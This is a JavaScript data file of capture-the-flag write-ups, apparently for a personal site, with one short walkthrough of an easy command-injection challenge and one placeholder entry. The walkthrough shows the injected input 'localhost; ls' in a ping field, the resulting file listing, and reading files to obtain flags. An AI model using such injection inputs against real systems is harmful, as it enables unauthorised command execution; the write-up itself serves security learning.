export const writeups = [
  {
    id: "ctf-name-challenge-1",
    title: "Practical Scenario - Command Injection",
    ctf: "SECPlayground x SWU 2026",
    category: "Web",
    difficulty: "Easy",
    year: "2026",
    summary: "simple command injection challenge.",
    content: `
## Overview

NetDiag Pro is a web-based network diagnostic tool used by IT administrators. The application provides a ping utility to test network connectivity. Your security assessment has identified potential input validation issues. Investigate the application and determine if it's vulnerable to command injection attacks..

## Reconnaissance

Ofcourse we start with view page source and the first flag is there.

\`\`\`
flag1{n3tw0rk_t00l_d1sc0v3r3d}
\`\`\`

and since this is a simple challenge we can just try to inject some commands in the input field and see if we can get a response.

## Finding the Vulnerability

we can see that the application is not properly sanitizing user input so we ping an address while injecting payload.

\`\`\`
localhost; ls
\`\`\`
 
which returnd the list of files in the current directory, confirming that the application is vulnerable to command injection.

\`\`\`
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.032 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.031 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.033 ms

--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2072ms
rtt min/avg/max/mdev = 0.031/0.032/0.033/0.000 ms
Dockerfile
__MACOSX
app.py
entrypoint.sh
exploit.py
readme.md
requirements.txt
solution.md
\`\`\`

## Exploitation

we cat solution.md and we get the flag.

\`\`\`
flag2{c0mm4nd_1nj3ct10n_w0rks}
\`\`\`

Following the instructions in solution.md we cat the secret file and we get the final flag.

\`\`\`
web{UyCT7MzwDn}
\`\`\`

## What I Learned

this challenge taught me about the importance of input validation and the dangers of command injection vulnerabilities.
    `.trim(),
  },
  {
    id: "ctf-name-challenge-2",
    title: "Another Challenge",
    ctf: "CTF Event Name",
    category: "Crypto",
    difficulty: "medium",
    year: "2025",
    summary: "Short description of what this one was about.",
    content: `
## Overview

Write your full writeup here using markdown.
    `.trim(),
  },
];

// difficulty options: "easy" | "medium" | "hard"
// category options: "Web" | "Crypto" | "Pwn" | "Reverse" | "Forensics" | "Misc" | "OSINT"
